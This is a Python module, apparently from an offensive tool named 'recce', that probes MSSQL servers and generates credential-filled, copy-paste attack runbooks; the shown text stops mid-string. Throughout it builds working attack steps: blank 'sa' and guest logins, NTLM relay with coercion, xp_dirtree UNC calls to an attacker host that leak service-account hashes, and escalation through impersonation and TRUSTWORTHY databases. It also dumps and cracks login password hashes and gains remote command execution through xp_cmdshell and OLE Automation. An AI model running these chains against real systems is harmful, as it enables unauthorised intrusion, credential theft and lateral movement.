"""MSSQL (Microsoft SQL Server) offensive enumeration + attack-chain runbook.

What state-of-the-art MSSQL offensive tooling (PowerUpSQL, impacket-mssqlclient,
nxc mssql, MSSQLPwner, SQLRecon) does, folded into recce's model:

  * PRE-AUTH, airgapped (stdlib only): SQL Browser (UDP 1434) instance / version /
    port enumeration, and a TDS pre-login probe for the exact server version and
    whether login encryption is enforced - no credentials, no external tools.
  * ACCESS + PRIVILEGE (with creds, via nxc - auto-run when present): which servers
    the credentials log into and whether the login is effectively admin (Pwn3d! =
    xp_cmdshell / sysadmin).
  * DEEP ENUM + PRIVESC CHAIN (the MSSQLPwner route): server roles, databases,
    TRUSTWORTHY DBs, the linked-server graph, impersonatable logins, xp_cmdshell /
    OLE / CLR / Agent status, sql_logins hashes and saved credentials - then the
    escalation chains (impersonation, TRUSTWORTHY+db_owner, linked-server hops,
    UNC->relay) and the command execution for effect (xp_cmdshell / sp_OACreate /
    CLR / Agent).

recce does the pre-auth probing itself and generates the full, credential-filled
runbook + chain (copy-paste ready); it references EXISTING tools (nxc / impacket /
mssqlpwner) for the authenticated actions and generates no exploit code.
"""
from __future__ import annotations

import socket
import struct

from .models import Host, Port

SQLBROWSER_PORT = 1434
_DEFAULT_PORT = 1433

# SQL Server major-version -> marketing name (for a friendly product label + so a
# stale build is obvious). Keyed on the TDS/browser major number.
VERSION_NAMES = {
    "8": "SQL Server 2000", "9": "SQL Server 2005", "10": "SQL Server 2008/R2",
    "11": "SQL Server 2012", "12": "SQL Server 2014", "13": "SQL Server 2016",
    "14": "SQL Server 2017", "15": "SQL Server 2019", "16": "SQL Server 2022",
}


def is_mssql(port: Port) -> bool:
    if port.portid in (1433,):
        return True
    blob = f"{port.service} {port.product}".lower()
    return "ms-sql" in blob or "mssql" in blob or "microsoft sql" in blob


def version_name(ver: str) -> str:
    """'15.0.2000.5' -> 'SQL Server 2019 (15.0.2000.5)'."""
    if not ver:
        return ""
    major = ver.split(".")[0]
    name = VERSION_NAMES.get(major)
    return f"{name} ({ver})" if name else ver


# --- SQL Browser (UDP 1434) -----------------------------------------------------

def _parse_browser(text: str) -> list[dict]:
    """Parse the SQL Browser SVR_RESP string. Instances are separated by ';;';
    each is a flat 'Key;Value;Key;Value;...' list."""
    out = []
    for chunk in text.split(";;"):
        parts = chunk.split(";")
        if len(parts) < 2:
            continue
        kv = {}
        for i in range(0, len(parts) - 1, 2):
            k, v = parts[i].strip(), parts[i + 1].strip()
            if k:
                kv[k.lower()] = v
        if kv.get("servername") or kv.get("instancename"):
            out.append({
                "server": kv.get("servername", ""),
                "instance": kv.get("instancename", ""),
                "clustered": kv.get("isclustered", ""),
                "version": kv.get("version", ""),
                "tcp": kv.get("tcp", ""),
                "np": kv.get("np", ""),
            })
    return out


def sql_browser(ip: str, timeout: float = 3.0) -> list[dict]:
    """Enumerate SQL Server instances via the SQL Browser (UDP 1434) - instance
    names, versions and TCP ports, NO credentials. Returns [] on any failure."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        try:
            s.sendto(b"\x02", (ip, SQLBROWSER_PORT))    # CLNT_UCAST_EX: list all
            data, _ = s.recvfrom(65535)
        finally:
            s.close()
    except OSError:
        return []
    if len(data) < 3 or data[0] != 0x05:
        return []
    # byte0 = 0x05, bytes1-2 = little-endian length, then the ASCII payload.
    return _parse_browser(data[3:].decode("latin-1", "replace"))


# --- TDS pre-login (TCP) --------------------------------------------------------

def _build_prelogin() -> bytes:
    """A minimal, valid TDS PRELOGIN request (VERSION/ENCRYPTION/INSTOPT/THREADID/
    MARS options). We request ENCRYPT_OFF so the server tells us its posture."""
    options = [(0x00, 6), (0x01, 1), (0x02, 1), (0x03, 4), (0x04, 1)]
    values = {0x00: b"\x00" * 6, 0x01: b"\x00", 0x02: b"\x00",
              0x03: b"\x00" * 4, 0x04: b"\x00"}
    table_size = 5 * len(options) + 1               # +1 for the 0xFF terminator
    offset = table_size
    table = b""
    data = b""
    for tok, ln in options:
        table += struct.pack(">BHH", tok, offset, ln)
        data += values[tok]
        offset += ln
    payload = table + b"\xff" + data
    header = struct.pack(">BBHHBB", 0x12, 0x01, 8 + len(payload), 0, 0, 0)
    return header + payload


_ENCRYPT = {0: "off (login only)", 1: "on", 2: "not supported", 3: "required"}


def _parse_prelogin(data: bytes) -> dict:
    """Parse a PRELOGIN response: server version + encryption posture."""
    if len(data) < 9 or data[0] != 0x04:
        return {}
    payload = data[8:]
    opts: dict[int, tuple[int, int]] = {}
    i = 0
    while i < len(payload) and payload[i] != 0xFF:
        if i + 5 > len(payload):
            break
        tok, off, ln = struct.unpack(">BHH", payload[i:i + 5])
        opts[tok] = (off, ln)
        i += 5
    out: dict = {}
    if 0x00 in opts:
        off, ln = opts[0x00]
        if off + 4 <= len(payload) and ln >= 4:
            major, minor = payload[off], payload[off + 1]
            build = struct.unpack(">H", payload[off + 2:off + 4])[0]
            out["version"] = f"{major}.{minor}.{build}"
    if 0x01 in opts:
        off, _ln = opts[0x01]
        if off < len(payload):
            out["encryption"] = _ENCRYPT.get(payload[off], str(payload[off]))
    return out


def prelogin(ip: str, port: int = _DEFAULT_PORT, timeout: float = 4.0) -> dict:
    """TDS pre-login probe: server version + whether login encryption is enforced,
    with NO credentials. Returns {} on any failure."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(_build_prelogin())
            data = s.recv(4096)
    except OSError:
        return {}
    return _parse_prelogin(data)


# --- target discovery -----------------------------------------------------------

def mssql_targets(hosts: list[Host]) -> list[dict]:
    """Every MSSQL endpoint recce knows about, from the datastore. One row per
    open MSSQL port: {ip, hostname, port, product, version}."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_mssql(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product, "version": p.version})
    return out


def probe_target(ip: str, port: int = _DEFAULT_PORT, active: bool = True) -> dict:
    """Credential-free gather for one endpoint: SQL Browser instances + a TDS
    pre-login (version, encryption). {instances:[...], prelogin:{...}}."""
    if not active:
        return {"instances": [], "prelogin": {}}
    return {"instances": sql_browser(ip), "prelogin": prelogin(ip, port)}


# --- credential substitution ----------------------------------------------------

def _fill(text: str, ctx: dict) -> str:
    """Substitute <ip>/<port>/<user>/<pass>/<domain>/<LHOST> tokens (longest first,
    single pass) so every command is copy-paste ready."""
    if not isinstance(text, str):
        return text
    subs = sorted(((k, v) for k, v in ctx.items() if v), key=lambda kv: -len(kv[0]))
    for tok, val in subs:
        text = text.replace(tok, str(val))
    return text


def _ctx(target: dict, creds: dict | None, lhost: str = "<LHOST>") -> dict:
    creds = creds or {}
    return {"<ip>": target.get("ip", "<ip>"), "<port>": str(target.get("port") or 1433),
            "<user>": creds.get("user") or "<user>", "<pass>": creds.get("secret") or "<pass>",
            "<domain>": creds.get("domain") or "<domain>", "<LHOST>": lhost}


# --- offline findings (misconfigurations / vulnerabilities) ---------------------

def _step(phase, step, tool, cmd, why):
    return {"phase": phase, "step": step, "tool": tool, "cmd": cmd, "why": why}


def _finding(sev, title, target, detail, tool, cmd, rem, cwes):
    return {"category": "mssql", "severity": sev, "title": title, "target": target,
            "detail": detail, "tool": tool, "command": cmd, "remediation": rem,
            "cwes": list(cwes)}


def _port_scripts(host: Host, portid: int) -> dict:
    for p in host.ports:
        if p.portid == portid:
            return {s.id: s.output for s in p.scripts}
    return {}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    """MSSQL misconfigurations / vulnerabilities from what recce already holds
    (nmap ms-sql-* NSE output + the pre-auth probe), each with the exact command to
    prove/abuse it. `probes` maps 'ip:port' -> probe_target() result."""
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for t in [p for p in h.open_ports if is_mssql(p)]:
            tgt = f"{h.ip}:{t.portid}"
            ctx = {"<ip>": h.ip, "<port>": str(t.portid)}
            scripts = _port_scripts(h, t.portid)
            pl = (probes.get(tgt) or {}).get("prelogin") or {}

            # sa / login with a blank or trivial password -> instant sysadmin.
            blank = any("empty password" in (v.title or "").lower() and v.port == t.portid
                        for v in h.vulns) or "ms-sql-empty-password" in scripts
            if blank:
                out.append(_finding(
                    "critical", "MSSQL login with a blank password (sysadmin -> RCE)",
                    tgt, "An account (typically 'sa') authenticates with an empty "
                    "password - full control of the instance.", "impacket-mssqlclient",
                    _fill("impacket-mssqlclient sa@<ip> -p <port>   # blank password; then "
                          "enable_xp_cmdshell; xp_cmdshell whoami", ctx),
                    "Set a strong sa password (or disable sa); enforce a password policy.",
                    ["CWE-521", "CWE-1392"]))

            # xp_cmdshell already enabled -> RCE as the service account.
            xpc = scripts.get("ms-sql-xp-cmdshell", "")
            if xpc and "error" not in xpc.lower() and "disabled" not in xpc.lower():
                out.append(_finding(
                    "high", "xp_cmdshell is enabled (OS command execution)",
                    tgt, "The instance can run OS commands via xp_cmdshell as the SQL "
                    "service account.", "impacket-mssqlclient / nxc",
                    _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
                    "Disable xp_cmdshell; run SQL under a low-privilege gMSA.",
                    ["CWE-250"]))

            # Pre-auth NTLM / host / domain disclosure (relay/coercion target).
            if "ms-sql-ntlm-info" in scripts:
                out.append(_finding(
                    "low", "MSSQL discloses NetBIOS / domain / FQDN pre-auth",
                    tgt, scripts["ms-sql-ntlm-info"].strip()[:200],
                    "manual / ntlmrelayx",
                    _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
                          "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                    "Restrict exposure; require SMB signing + EPA to blunt relay.",
                    ["CWE-200"]))

            # TDS login encryption not supported at all -> creds sniffable.
            enc = pl.get("encryption")
            if enc == "not supported":
                out.append(_finding(
                    "medium", "MSSQL does not support login encryption (credential sniffing)",
                    tgt, "The server advertised no TDS encryption - login credentials "
                    "cross the wire unprotected.", "wireshark / responder",
                    _fill("impacket-mssqlclient <user>@<ip> -p <port>   # traffic is unencrypted",
                          ctx),
                    "Install a certificate and enable Force Encryption on the instance.",
                    ["CWE-319"]))

            # Unsupported / end-of-life SQL Server (no security patches).
            ver = pl.get("version") or t.version
            major = (ver or "").split(".")[0]
            if major.isdigit() and int(major) <= 12:      # 2014 and older are EOL
                out.append(_finding(
                    "medium", f"End-of-life SQL Server ({version_name(ver)})",
                    tgt, "This SQL Server build is out of support and receives no "
                    "security updates.", "version",
                    _fill("nmap -p <port> --script ms-sql-info <ip>", ctx),
                    "Upgrade to a supported SQL Server release.",
                    ["CWE-1104"]))
    return out


# --- credential-free runbook ----------------------------------------------------

def credfree_runbook(target: dict, lhost: str = "<LHOST>") -> list[dict]:
    """What to try with NO credentials: instance/version recon (recce already did
    the SQL Browser + pre-login probes), then default/anonymous access and relay."""
    ctx = _ctx(target, None, lhost)
    f = lambda s: _fill(s, ctx)   # noqa: E731
    return [
        _step("Recon (no creds)", "SQL Browser instance/version/port enumeration",
              "recce (stdlib) / nmap",
              f("nmap -sU -p 1434 --script ms-sql-info <ip>"),
              "Instance names, versions and TCP ports without authenticating."),
        _step("Recon (no creds)", "TDS pre-login: version + encryption posture",
              "recce (stdlib)",
              f("recce mssql <ip>   # sends a TDS pre-login and reads the version/encryption"),
              "Exact server version (-> CVE mapping) and whether login is encrypted."),
        _step("Access (no creds)", "Blank / default 'sa' login",
              "nxc / impacket-mssqlclient",
              f("nxc mssql <ip> -u sa -p '' --local-auth   ;   impacket-mssqlclient sa@<ip>"),
              "A blank or default sa password is instant sysadmin (RCE)."),
        _step("Access (no creds)", "Anonymous / guest login",
              "nxc",
              f("nxc mssql <ip> -u '' -p ''   ;   nxc mssql <ip> -u guest -p ''"),
              "Some instances allow a null/guest session that still enumerates."),
        _step("Access (no creds)", "NTLM relay to MSSQL (with a coercion)",
              "impacket-ntlmrelayx",
              f("impacket-ntlmrelayx -t mssql://<ip> -smb2support   # + coerce a victim "
                "(PetitPotam/printerbug) to auth -> relayed as that account"),
              "If Windows auth is on, a relayed privileged account logs straight in."),
    ]


# --- credentialed runbook (the MSSQLPwner route) --------------------------------

def cred_runbook(target: dict, creds: dict | None, lhost: str = "<LHOST>") -> list[dict]:
    """With credentials: prove access, enumerate everything, escalate, get effect.
    Mirrors PowerUpSQL / MSSQLPwner. Every command is pre-filled with the creds."""
    ctx = _ctx(target, creds, lhost)
    f = lambda s: _fill(s, ctx)   # noqa: E731
    q = lambda tsql: f("nxc mssql <ip> -u <user> -p <pass> -q \"%s\"" % tsql)  # noqa: E731
    steps = [
        _step("Access", "Which servers accept these creds (and are you admin?)",
              "nxc mssql",
              f("nxc mssql <ip> -u <user> -p <pass> -d <domain>   "
                "# 'Pwn3d!' = sysadmin / xp_cmdshell"),
              "nxc is the fastest access + privilege matrix; --local-auth for SQL logins."),
        _step("Access", "Interactive shell on the instance", "impacket-mssqlclient",
              f("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   "
                "(SQL auth: impacket-mssqlclient <user>:<pass>@<ip>)"),
              "A full T-SQL client for the enumeration + escalation below."),
        # --- enumerate everything ---
        _step("Enumerate", "Server identity, role, auth mode", "nxc / mssqlclient",
              q("SELECT @@VERSION; SELECT SERVERPROPERTY('MachineName'), SYSTEM_USER, "
                "IS_SRVROLEMEMBER('sysadmin'), SERVERPROPERTY('IsIntegratedSecurityOnly')"),
              "Who am I, am I already sysadmin, is it Windows-auth-only."),
        _step("Enumerate", "Logins and who is sysadmin", "mssqlclient",
              q("SELECT name, type_desc, is_disabled, IS_SRVROLEMEMBER('sysadmin', name) "
                "FROM sys.server_principals WHERE type IN ('S','U','G')"),
              "The privileged logins to target for impersonation / cracking."),
        _step("Enumerate", "Databases, owners and TRUSTWORTHY flag", "mssqlclient",
              q("SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS owner "
                "FROM sys.databases"),
              "A TRUSTWORTHY db owned by a sysadmin is a db_owner -> sysadmin path."),
        _step("Enumerate", "Linked servers (lateral graph)", "mssqlclient",
              q("SELECT name, product, provider, data_source, is_linked FROM sys.servers"),
              "Linked servers let you EXECUTE AT / OPENQUERY other instances - pivot."),
        _step("Enumerate", "Impersonatable logins (privesc)", "mssqlclient",
              q("SELECT DISTINCT b.name FROM sys.server_permissions a JOIN "
                "sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                "WHERE a.permission_name='IMPERSONATE'"),
              "Any sysadmin you can EXECUTE AS is an instant escalation."),
        _step("Enumerate", "Dangerous config (xp_cmdshell / OLE / CLR)", "mssqlclient",
              q("SELECT name, value_in_use FROM sys.configurations WHERE name IN "
                "('xp_cmdshell','Ole Automation Procedures','clr enabled')"),
              "What execution primitives are already on (or you can turn on as sa)."),
        _step("Secrets", "Dump SQL login password hashes (needs CONTROL SERVER)",
              "mssqlclient",
              q("SELECT name, password_hash FROM sys.sql_logins WHERE password_hash IS NOT NULL"),
              "Crack offline (hashcat -m 1731) - reuse across the estate."),
        _step("Secrets", "Stored credentials, linked-server logins, Agent proxies",
              "mssqlclient",
              q("SELECT name, credential_identity FROM sys.credentials; "
                "SELECT * FROM sys.linked_logins"),
              "Saved credentials often hold a domain / privileged account."),
        # --- escalate (the chains) ---
        _step("Escalate", "Impersonation chain -> sysadmin", "mssqlclient / nxc",
              f("EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); "
                "REVERT;   (nxc: -M mssql_priv)"),
              "If you can impersonate a sysadmin login, you ARE sysadmin."),
        _step("Escalate", "TRUSTWORTHY + db_owner -> sysadmin", "mssqlclient",
              f("USE <trustdb>; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;"),
              "db_owner on a TRUSTWORTHY db owned by a sysadmin escalates you to sysadmin."),
        _step("Escalate", "Linked-server hop (EXECUTE AT / OPENQUERY)", "mssqlclient / mssqlpwner",
              f("SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, "
                "IS_SRVROLEMEMBER(''sysadmin'')');   EXEC('sp_configure ''xp_cmdshell'',1;"
                "RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED];"),
              "Linked logins often map to sa on the remote - RCE there, then chain onward."),
        _step("Escalate", "MSSQLPwner: auto-map + walk the chain", "mssqlpwner",
              f("mssqlpwner <domain>/<user>:<pass>@<ip> enumerate; "
                "mssqlpwner <domain>/<user>:<pass>@<ip> interactive"),
              "Automates impersonation + linked-server chains to sysadmin and RCE."),
        # --- effect ---
        _step("Effect (RCE)", "xp_cmdshell", "nxc / mssqlclient",
              f("nxc mssql <ip> -u <user> -p <pass> -x 'whoami /all'   (mssqlclient: "
                "enable_xp_cmdshell; xp_cmdshell whoami)"),
              "OS command execution as the SQL service account."),
        _step("Effect (RCE)", "OLE Automation (sp_OACreate)", "mssqlclient",
              f("EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE; DECLARE @o INT; "
                "EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,"
                "'cmd /c whoami > C:\\\\windows\\\\temp\\\\o.txt';"),
              "RCE path when xp_cmdshell is watched/disabled."),
        _step("Effect (RCE)", "CLR assembly / SQL Agent job", "mssqlpwner / PowerUpSQL",
              f("mssqlpwner <domain>/<user>:<pass>@<ip> custom-asm whoami   (or a SQL Agent "
                "CmdExec/PowerShell job)"),
              "Alternative execution primitives once you are sysadmin."),
        # --- lateral ---
        _step("Lateral", "Capture the service account's NetNTLM via UNC", "mssqlclient + ntlmrelayx",
              f("EXEC xp_dirtree '\\\\<LHOST>\\x';   with impacket-ntlmrelayx -t "
                "smb://<dc-or-host> -smb2support running"),
              "Relay the SQL service account (often privileged) to another host."),
    ]
    return steps


# --- attack chain (the 'so what') -----------------------------------------------

def attack_chain(target: dict, fs: list[dict], creds: dict | None) -> list[str]:
    """A short, grounded chain narrative for the target, from entry to effect."""
    tgt = f"{target['ip']}:{target.get('port', 1433)}"
    have = [f for f in fs if f["target"] == tgt]
    lines = []
    entry = "valid credentials" if creds and creds.get("user") else None
    if any("blank password" in f["title"].lower() for f in have):
        entry = "the blank-password login (sa)"
    if entry:
        chain = [f"Foothold: {entry} on {tgt}"]
        if any("xp_cmdshell is enabled" in f["title"].lower() for f in have):
            chain.append("xp_cmdshell is already on -> OS command execution now")
        else:
            chain.append("escalate to sysadmin (impersonation / TRUSTWORTHY / linked server)")
        chain.append("enable + run xp_cmdshell (or OLE/CLR) as the service account")
        chain.append("capture/relay the service account or hop linked servers to move laterally")
        lines.append("Likely path: " + " -> ".join(chain) + ".")
    else:
        lines.append(f"{tgt}: no confirmed entry yet - run the no-cred checks (blank sa, "
                     "relay) or supply credentials to walk the MSSQLPwner route.")
    return lines


# --- live nxc mssql (access + privilege matrix; auto-run when present) ----------

def nxc_tool() -> str | None:
    from . import credenum
    return credenum.smb_tool()             # nxc / netexec / crackmapexec / cme


def parse_nxc_mssql(output: str) -> dict:
    """Parse `nxc mssql <ip> -u U -p P`. Returns
    {access, admin, banner}: whether the creds logged in, whether admin (Pwn3d!)."""
    access = admin = False
    banner = ""
    for raw in output.splitlines():
        line = raw.strip()
        low = line.lower()
        if "mssql" not in low:
            continue
        if "[+]" in line:
            access = True
            if "pwn3d" in low or "(admin)" in low:
                admin = True
        if "(name:" in low or "(domain:" in low:
            banner = line
    return {"access": access, "admin": admin, "banner": banner}


def run_nxc_mssql(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                  local_auth: bool = False) -> tuple[dict | None, str | None]:
    """Run nxc mssql for the access/privilege check. Returns (parsed, error).
    (parsed is None when nxc isn't installed - the caller falls back to commands.)"""
    from . import credenum
    tool = nxc_tool()
    if not tool:
        return None, "netexec/nxc not installed"
    cmd = [tool, "mssql", ip, "-u", creds.get("user", ""),
           "-p", creds.get("secret", "")]
    if creds.get("domain") and not local_auth:
        cmd += ["-d", creds["domain"]]
    if local_auth:
        cmd += ["--local-auth"]
    if port and port != _DEFAULT_PORT:
        cmd += ["--port", str(port)]
    out, err = credenum._run(cmd)
    if err:
        return None, err
    return parse_nxc_mssql(out), None


# --- live enumeration via impacket-mssqlclient ----------------------------------
# Each query's result is bracketed by sentinel SELECTs so we can extract it
# robustly from impacket's tabular output. Every row is emitted as a single
# '|'-delimited string (one column) so parsing is trivial and format-independent.
_ENUM_SECTIONS = {
    "server": "SELECT CAST(SERVERPROPERTY('MachineName') AS varchar(128))+'|'+"
              "CAST(SYSTEM_USER AS varchar(128))+'|'+"
              "CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(4))+'|'+"
              "CAST(ISNULL(SERVERPROPERTY('IsIntegratedSecurityOnly'),0) AS varchar(4))+'|'+"
              "CAST(SERVERPROPERTY('ProductVersion') AS varchar(64))",
    "logins": "SELECT name+'|'+CAST(IS_SRVROLEMEMBER('sysadmin',name) AS varchar(4)) "
              "FROM sys.server_principals WHERE type IN ('S','U','G') AND name NOT LIKE '##%'",
    "databases": "SELECT name+'|'+CAST(is_trustworthy_on AS varchar(4))+'|'+"
                 "ISNULL(SUSER_SNAME(owner_sid),'') FROM sys.databases",
    "links": "SELECT name+'|'+ISNULL(product,'')+'|'+ISNULL(data_source,'') "
             "FROM sys.servers WHERE is_linked=1",
    "impersonate": "SELECT DISTINCT b.name+'|'+CAST(IS_SRVROLEMEMBER('sysadmin',b.name) "
                   "AS varchar(4)) FROM sys.server_permissions a JOIN sys.server_principals b "
                   "ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'",
    "config": "SELECT name+'|'+CAST(value_in_use AS varchar(8)) FROM sys.configurations "
              "WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled')",
    "hashes": "SELECT name+'|'+CONVERT(varchar(max),password_hash,1) FROM sys.sql_logins "
              "WHERE password_hash IS NOT NULL",
}


def mssqlclient_tool() -> str | None:
    from . import credenum
    return credenum.impacket_tool("mssqlclient")


def build_enum_script() -> str:
    """The T-SQL fed to impacket-mssqlclient over stdin: each section wrapped in
    @@B:<name>/@@E:<name> sentinels, then exit."""
    lines = []
    for name, q in _ENUM_SECTIONS.items():
        lines.append(f"SELECT '@@B:{name}'")
        lines.append(q)
        lines.append(f"SELECT '@@E:{name}'")
    lines.append("exit")
    return "\n".join(lines) + "\n"


def _run_stdin(cmd: list[str], data: str, timeout: int = 180) -> tuple[str, str | None]:
    import subprocess
    try:
        p = subprocess.run(cmd, input=data, capture_output=True, text=True,
                           errors="replace", timeout=timeout)
        return (p.stdout or "") + (p.stderr or ""), None
    except subprocess.TimeoutExpired:
        return "", f"timed out after {timeout}s"
    except (OSError, ValueError) as e:
        return "", str(e)


def parse_enum(output: str) -> dict:
    """Pull each sentinel-wrapped section out of impacket-mssqlclient output.
    Returns {section: [[col, ...], ...]} - each row split on '|'."""
    import re
    sections: dict[str, list] = {}
    for name in _ENUM_SECTIONS:
        m = re.search(rf"@@B:{name}\b(.*?)@@E:{name}\b", output, re.S)
        rows = []
        if m:
            for line in m.group(1).splitlines():
                line = line.strip()
                if "|" in line and "----" not in line and not line.startswith("@@"):
                    rows.append([c.strip() for c in line.split("|")])
        sections[name] = rows
    return sections


def _mssqlclient_cmd(ip: str, creds: dict, port: int, windows_auth: bool) -> list[str] | None:
    tool = mssqlclient_tool()
    if not tool:
        return None
    user, secret, dom = creds.get("user", ""), creds.get("secret", ""), creds.get("domain", "")
    if windows_auth and dom:
        cmd = [tool, f"{dom}/{user}:{secret}@{ip}", "-windows-auth"]
    else:
        cmd = [tool, f"{user}:{secret}@{ip}"]
    if port and port != _DEFAULT_PORT:
        cmd += ["-port", str(port)]
    return cmd


def run_mssqlclient(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                    windows_auth: bool = True) -> tuple[dict | None, str | None]:
    """Connect with impacket-mssqlclient and run the enumeration script. Returns
    (sections, error). sections is None when the tool is missing or login failed."""
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
    if cmd is None:
        return None, "impacket-mssqlclient not installed"
    out, err = _run_stdin(cmd, build_enum_script())
    if err:
        return None, err
    sections = parse_enum(out)
    if not sections.get("server"):
        return None, "login failed or nothing returned"
    return sections, None


def link_runner(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                windows_auth: bool = True):
    """A runner(script)->output for walk_links: runs a batch on the ENTRY instance
    via impacket-mssqlclient. Returns a callable; '' on tool-missing / error."""
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)

    def run(script: str) -> str:
        if cmd is None:
            return ""
        out, err = _run_stdin(cmd, script)
        return "" if err else out
    return run


def chains_from_enum(target: dict, enum: dict, creds: dict | None):
    """Turn a live enumeration into concrete findings + a grounded escalation chain
    for THIS instance. Returns (findings, chain_steps, summary)."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    ctx = _ctx(target, creds)
    fs: list[dict] = []
    chain: list[str] = []

    server = enum.get("server") or []
    me = (creds or {}).get("user", "")
    is_sa = False
    if server:
        row = server[0]
        me = row[1] if len(row) > 1 else me
        is_sa = len(row) > 2 and row[2] == "1"
        if len(row) > 4 and row[4] and not target.get("version"):
            target["version"] = row[4]
    target["live_login"] = me
    if is_sa:
        target["admin"] = True
    else:
        target.setdefault("access", True)

    sysadmins = {r[0] for r in enum.get("logins", []) if len(r) > 1 and r[1] == "1"}

    if is_sa:
        chain.append(f"already sysadmin as {me}")
        fs.append(_finding(
            "critical", "Credentials are sysadmin on this MSSQL instance", tgt,
            f"{me} is a member of the sysadmin server role (xp_cmdshell / RCE).",
            "nxc / impacket-mssqlclient",
            _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
            "Least-privilege the login; remove sysadmin.", ["CWE-250", "CWE-269"]))

    imp_sa = [r[0] for r in enum.get("impersonate", []) if len(r) > 1 and r[1] == "1"]
    if imp_sa and not is_sa:
        who = imp_sa[0]
        chain.append(f"impersonate sysadmin login '{who}' (EXECUTE AS)")
        fs.append(_finding(
            "high", "Impersonatable sysadmin login (privesc to sysadmin)", tgt,
            f"The login can EXECUTE AS LOGIN = '{who}', which is a sysadmin.",
            "impacket-mssqlclient",
            _fill(f"EXECUTE AS LOGIN = '{who}'; SELECT IS_SRVROLEMEMBER('sysadmin'); "
                  "-- then run xp_cmdshell; REVERT", ctx),
            "Remove IMPERSONATE grants pointing at sysadmin logins.", ["CWE-269"]))

    trust = [r for r in enum.get("databases", []) if len(r) > 2 and r[1] == "1"]
    trust_sa = [r for r in trust if r[2] in sysadmins
                or r[2].lower() == "sa" or r[2].lower().endswith("\\sa")]
    if trust_sa and not is_sa:
        db = trust_sa[0][0]
        chain.append(f"abuse TRUSTWORTHY db '{db}' (db_owner + EXECUTE AS OWNER)")
        fs.append(_finding(
            "high", "TRUSTWORTHY database owned by a sysadmin (privesc)", tgt,
            f"Database '{db}' is TRUSTWORTHY and owned by a sysadmin - if you are "
            f"db_owner there, escalate to sysadmin.", "impacket-mssqlclient",
            _fill(f"USE [{db}]; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                  "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;", ctx),
            "Turn off TRUSTWORTHY; don't set a sysadmin as the owner of a user DB.",
            ["CWE-269"]))

    links = [r[0] for r in enum.get("links", [])]
    if links:
        chain.append(f"hop linked server(s) {', '.join(links[:3])} (OPENQUERY / EXECUTE AT)")
        fs.append(_finding(
            "medium", f"{len(links)} linked server(s) reachable (lateral / privesc)", tgt,
            "Linked servers: " + ", ".join(links[:8]) + ". Linked logins often map to "
            "a privileged account (sa) on the remote.", "impacket-mssqlclient / mssqlpwner",
            _fill("SELECT * FROM OPENQUERY([%s], 'SELECT SYSTEM_USER, "
                  "IS_SRVROLEMEMBER(''sysadmin'')');" % links[0], ctx),
            "Review linked-server login mappings; avoid mapping to sysadmin.", ["CWE-284"]))

    cfg = {r[0]: r[1] for r in enum.get("config", []) if len(r) > 1}
    if cfg.get("xp_cmdshell") == "1":
        fs.append(_finding(
            "high", "xp_cmdshell is enabled (OS command execution)", tgt,
            "xp_cmdshell = 1 - run OS commands as the SQL service account now.",
            "nxc / impacket-mssqlclient",
            _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
            "Disable xp_cmdshell; run SQL under a low-privilege gMSA.", ["CWE-250"]))

    hashes = [r[0] for r in enum.get("hashes", [])]
    if hashes:
        fs.append(_finding(
            "high", f"Recovered {len(hashes)} SQL login password hash(es)", tgt,
            "Dumped sys.sql_logins hashes (" + ", ".join(hashes[:8]) + ") - crack "
            "offline with hashcat -m 1731 and reuse across the estate.",
            "impacket-mssqlclient",
            "hashcat -m 1731 mssql_hashes.txt wordlist.txt",
            "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"]))

    if not is_sa and not chain:
        chain.append(f"low-priv login as {me} - hunt for a linked-server or db_owner path")
    summary = {
        "login": me, "is_sysadmin": is_sa, "sysadmins": sorted(sysadmins),
        "logins": [r[0] for r in enum.get("logins", [])],
        "databases": enum.get("databases", []),
        "trustworthy": [r[0] for r in trust], "links": links,
        "impersonate": [r[0] for r in enum.get("impersonate", [])],
        "config": cfg, "hashes": hashes,
    }
    return fs, chain, summary


# --- recursive linked-server walk (the MSSQLPwner graph) ------------------------
# The identity/privilege/sublinks query run AT each remote node. Uses the
# FOR XML PATH trick (works on 2008+) to concatenate the node's own linked servers.
_LINK_INNER = (
    "SELECT CAST(@@SERVERNAME AS varchar(128))+'|'+CAST(SYSTEM_USER AS varchar(128))+'|'+"
    "CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(4))+'|'+ISNULL(STUFF((SELECT ','+name "
